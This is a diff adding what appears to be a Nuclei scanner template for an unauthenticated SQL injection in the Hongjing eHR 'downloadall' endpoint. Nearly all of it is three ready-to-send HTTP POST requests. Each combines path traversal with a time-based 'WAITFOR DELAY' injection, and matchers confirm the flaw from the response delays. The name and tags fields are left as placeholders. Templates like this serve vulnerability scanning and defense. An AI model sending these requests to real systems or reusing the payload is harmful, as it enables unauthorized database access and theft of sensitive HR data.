@@ -1,0 +1,51 @@
+id: hjsoft-hcm-downloadall-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 宏景eHR downloadall 接口处存在SQL注入漏洞，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/H1-5%E5%AE%8F%E6%99%AF-%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86-SQL?id=h1-5%e5%ae%8f%e6%99%af-%e4%ba%ba%e5%8a%9b%e8%b5%84%e6%ba%90%e7%ae%a1%e7%90%86-sql
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /templates/attestation/../../sys/downloadall HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 105
+
+        ext=1&filenamecolumn=1&content=1&tablename=master.dbo.sysdatabases&fileid=1&id=1';WAITFOR DELAY '0:0:3'--
+      - |-
+        POST /templates/attestation/../../sys/downloadall HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 105
+
+        ext=1&filenamecolumn=1&content=1&tablename=master.dbo.sysdatabases&fileid=1&id=1';WAITFOR DELAY '0:0:6'--
+      - |-
+        POST /templates/attestation/../../sys/downloadall HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 105
+
+        ext=1&filenamecolumn=1&content=1&tablename=master.dbo.sysdatabases&fileid=1&id=1';WAITFOR DELAY '0:0:9'--
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
